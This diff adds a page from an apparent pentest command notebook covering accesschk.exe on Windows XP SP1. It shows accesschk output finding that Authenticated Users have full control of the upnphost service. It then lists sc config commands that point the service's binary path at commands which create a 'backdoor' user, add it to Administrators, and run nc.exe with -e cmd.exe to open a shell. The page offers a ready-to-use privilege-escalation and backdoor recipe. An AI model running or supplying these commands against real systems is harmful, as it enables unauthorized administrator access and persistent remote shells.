@@ -1,0 +1,47 @@
+---
+title: "accesschk.exe"
+sidebarTitle: "accesschk.exe"
+description: "Commands and examples collected from your accesschk.exe notes."
+keywords: ["accesschk.exe"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/accesschk.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=accesschk) · [All tools](/index)
+
+## Example with Windows XP SP1 - upnphost
+
+**Notebook example**
+
+```powershell
+$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS
+
+$ accesschk.exe -ucqv upnphost
+upnphost
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+
+$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
+$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+$ sc stop <vuln-service>
+$ sc start <vuln-service>
+$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
+$ sc stop <vuln-service>
+$ sc start <vuln-service>
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
